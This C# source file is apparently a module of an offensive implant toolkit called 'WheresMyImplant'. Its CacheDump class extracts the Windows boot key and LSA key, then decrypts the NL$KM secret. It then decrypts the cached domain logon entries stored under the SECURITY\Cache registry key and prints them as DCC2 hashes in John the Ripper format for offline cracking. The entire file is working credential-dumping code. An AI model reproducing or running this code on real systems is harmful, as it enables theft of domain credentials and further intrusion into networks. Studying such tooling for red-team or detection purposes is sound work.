using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;

namespace WheresMyImplant
{
    class CacheDump : Base
    {
        public Boolean croak = false;

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public CacheDump()
        {
            String logonCount = (String)Reg.ReadRegKey(Reg.HKEY_LOCAL_MACHINE, @"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "CachedLogonsCount");
            WriteOutputNeutral(String.Format("{0} Cached Logons Set", logonCount));

            Byte[] bootKey = LSASecrets.GetBootKey();
            WriteOutputGood("BootKey : " + BitConverter.ToString(bootKey).Replace("-", ""));
            Byte[] lsaKey = LSASecrets.GetLsaKey(bootKey);
            WriteOutputGood("LSA Key : " + BitConverter.ToString(lsaKey).Replace("-", ""));
            Byte[] nlkm = GetNlkm(lsaKey);
            WriteOutputGood("LSA Key : " + BitConverter.ToString(nlkm).Replace("-", ""));
            GetCache(nlkm);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private void parseDecryptedData(ref Structs.CacheData cacheData, ref Byte[] decrypted)
        {
            ////////////////////////////////////////////////////////////////////////////////
            Int32 offset = 72;
            Int32 userNameLength = BitConverter.ToInt16(cacheData.userNameLength, 0);
            String username = Encoding.Unicode.GetString(decrypted.Skip(offset).Take(userNameLength).ToArray());

            ////////////////////////////////////////////////////////////////////////////////
            offset += userNameLength + (2 * ((userNameLength / 2) % 2));
            Int32 domainNameLength = BitConverter.ToInt16(cacheData.domainNameLength, 0);
            String domain = Encoding.Unicode.GetString(decrypted.Skip(offset).Take(domainNameLength).ToArray());

            ////////////////////////////////////////////////////////////////////////////////
            //offset += domainNameLength + (2 * ((domainNameLength / 2) % 2));
            //Int32 dnsdomainNameLength = BitConverter.ToInt16(cacheData.dnsDomainNameLength, 0);
            //String dnsDomain = Encoding.Unicode.GetString(decrypted.Skip(offset).Take(dnsdomainNameLength).ToArray());

            String hash = BitConverter.ToString(decrypted.Take(0x10).ToArray()).Replace("-", "");

            Int64 iterationCount = BitConverter.ToInt16(cacheData.iterationCount, 0);
            if (iterationCount > 10240)
            {
                iterationCount &= 0xfffffc00;
            }
            else
            {
                iterationCount *= 1024;
            }

            WriteOutput(String.Format("{0}\\{1}:$DCC2${2}#{1}#{3}::", domain, username, iterationCount, hash));
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private void GetCache(Byte[] nlkm)
        {
            String[] cacheValues = Registry.LocalMachine.OpenSubKey(@"SECURITY\Cache").GetValueNames();
            WriteOutputGood("[+] JtR format: ");
            foreach (String value in cacheValues)
            {
                if (value == @"NL$Control")
                {
                    continue;
                }
                Byte[] data = (Byte[])Registry.LocalMachine.OpenSubKey(@"SECURITY\Cache\").GetValue(value);
                Byte[] encData = data.Skip(96).Take(data.Length - 96).ToArray();

                ////////////////////////////////////////////////////////////////////////////////
                GCHandle pinnedArray = GCHandle.Alloc(data, GCHandleType.Pinned);
                IntPtr bytesPtr = pinnedArray.AddrOfPinnedObject();
                Structs.CacheData cacheData = (Structs.CacheData)Marshal.PtrToStructure(bytesPtr, typeof(Structs.CacheData));

                ////////////////////////////////////////////////////////////////////////////////
                if (cacheData.userNameLength[0] == (byte)00)
                {
                    continue;
                }

                if (encData.Length % 16 != 0)
                {
                    Byte[] padding = new Byte[16 - (encData.Length % 16)];
                    for (Int32 i = 0; i < padding.Length; i++)
                    {
                        padding[i] = (byte)'\0';
                    }
                    encData = Misc.combine(encData, padding);
                }

                ////////////////////////////////////////////////////////////////////////////////
                Byte[] aesDecrypted = new Byte[0];
                using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
                {
                    aes.KeySize = 128;
                    aes.Mode = CipherMode.CBC;
                    aes.Key = nlkm.Skip(16).Take(16).ToArray();
                    aes.Padding = PaddingMode.Zeros;
                    aes.IV = cacheData.challenge;
                    ICryptoTransform decryptor = aes.CreateDecryptor();
                    for (Int32 i = 0; i < encData.Length; i += 16)
                    { 
                        aesDecrypted = Misc.combine(aesDecrypted, decryptor.TransformFinalBlock(encData, i, 16));
                    }
                }
                parseDecryptedData(ref cacheData, ref aesDecrypted);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static Byte[] GetNlkm(Byte[] lsaKey)
        {
            Byte[] encryptedNlkm = (Byte[])Reg.ReadRegKey(Reg.HKEY_LOCAL_MACHINE, @"SECURITY\Policy\Secrets\NL$KM\CurrVal", "");
            return LSASecrets.DecryptLsa(encryptedNlkm, lsaKey);
        }
    }
}